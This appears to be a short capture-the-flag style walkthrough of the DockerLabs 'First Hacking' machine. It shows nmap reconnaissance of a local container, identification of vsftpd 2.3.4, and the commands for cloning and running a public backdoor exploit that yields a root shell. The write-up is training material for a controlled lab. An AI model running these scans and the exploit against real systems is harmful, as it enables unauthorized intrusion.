---
title: First Hacking
description: First Hacking DockerLabs walkthrough covering reconnaissance, exploitation, and privilege escalation.
hide:
  - navigation
---

# First Hacking

- Difficulty: Super easy
- Time to read: 6 minutes
- Tags: dockerlabs, ftp, privilege-escalation, enumeration, exploitation

## Introduction

This lab is a simple but useful introduction to enumeration, exploitation, and privilege escalation in a controlled environment. The machine exposes a single FTP service and demonstrates how an outdated service version can be abused quickly.

## Enumeración

The first step is to deploy the vulnerable machine and run a recon scan.

```bash
chmod +x auto_deploy.sh
sudo ./auto_deploy.sh firsthacking.tar
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
```

We identify the following service:

```text
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 64
```

Then we perform a more detailed scan:

```bash
nmap -sCV -p21 172.17.0.2 -oN targeted
```

This reveals:

```text
21/tcp open  ftp     vsftpd 2.3.4
```

## Explotación

The vulnerable service version is quickly identified via searchsploit:

```bash
searchsploit vsftpd 2.3.4
```

The environment is then exploited using the public PoC for the backdoor vulnerability:

```bash
git clone https://github.com/Hellsender01/vsftpd_2.3.4_Exploit.git
sudo python3 -m pip install pwntools
python3 exploit.py 172.17.0.2
```

The result is a root shell:

```text
[+] Got Shell!!!
$ whoami
root
```

## Escalada de privilegios

No additional privilege escalation was required because the vulnerability itself grants direct root access in this lab scenario.

## Lecciones aprendidas

- Reconnaissance is key to choosing the right exploit path.
- Legacy service versions are a common source of easy wins in labs and misconfigured environments.
- Searchsploit and public PoCs can accelerate threat validation when used responsibly in a controlled setup.

## Herramientas usadas

- Nmap
- Searchsploit
- GitHub PoC repos
- FTP service exploitation tooling
- pwntools
